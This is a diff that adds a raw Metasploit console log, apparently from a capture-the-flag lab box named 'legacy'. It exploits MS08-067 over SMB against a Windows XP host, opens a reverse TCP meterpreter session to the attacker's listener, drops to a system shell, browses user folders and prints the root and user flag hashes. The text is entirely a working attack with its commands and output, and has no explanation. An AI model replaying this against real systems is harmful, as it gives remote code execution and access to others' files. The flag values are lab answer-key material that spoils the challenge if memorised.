@@ -1,0 +1,113 @@
+
+msf6 > use exploit/windows/smb/ms08_067_netapi
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.202.128  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4
+rhosts => 10.10.10.4
+msf6 exploit(windows/smb/ms08_067_netapi) > set lhost 10.10.14.8
+lhost => 10.10.14.8
+msf6 exploit(windows/smb/ms08_067_netapi) > run
+
+[*] Started reverse TCP handler on 10.10.14.8:4444
+[*] 10.10.10.4:445 - Automatically detecting the target...
+[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (175174 bytes) to 10.10.10.4
+[*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.4:1029) at 2021-05-05 02:03:14 -0400
+
+meterpreter > shell
+Process 1256 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>echo %hostname%
+echo %hostname%
+%hostname%
+
+C:\WINDOWS\system32>hostname
+hostname
+legacy
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\
+
+16/03/2017  08:30                  0 AUTOEXEC.BAT
+16/03/2017  08:30                  0 CONFIG.SYS
+16/03/2017  09:07     <DIR>          Documents and Settings
+16/03/2017  08:33     <DIR>          Program Files
+16/03/2017  08:33     <DIR>          WINDOWS
+               2 File(s)              0 bytes
+               3 Dir(s)   6.472.818.688 bytes free
+
+C:\>cd Documents and Settings
+cd Documents and Settings
+
+C:\Documents and Settings>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\Documents and Settings
+
+16/03/2017  09:07     <DIR>          .
+16/03/2017  09:07     <DIR>          ..
+16/03/2017  09:07     <DIR>          Administrator
+16/03/2017  08:29     <DIR>          All Users
+16/03/2017  08:33     <DIR>          john
+               0 File(s)              0 bytes
+               5 Dir(s)   6.472.818.688 bytes free
+
+C:\Documents and Settings>dir Administrator
+dir Administrator
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\Documents and Settings\Administrator
+
+16/03/2017  09:07     <DIR>          .
+16/03/2017  09:07     <DIR>          ..
+16/03/2017  09:18     <DIR>          Desktop
+16/03/2017  09:07     <DIR>          Favorites
+16/03/2017  09:07     <DIR>          My Documents
+16/03/2017  08:20     <DIR>          Start Menu
+               0 File(s)              0 bytes
+               6 Dir(s)   6.472.818.688 bytes free
+
+C:\Documents and Settings>type Administrator\Desktop\root.txt
+type Administrator\Desktop\root.txt
+993442d258b0e0ec917cae9e695d5713
+C:\Documents and Settings>type john\Desktop\user.txt
+type john\Desktop\user.txt
+e69af0e4f443de7e36876fda4ec7644f
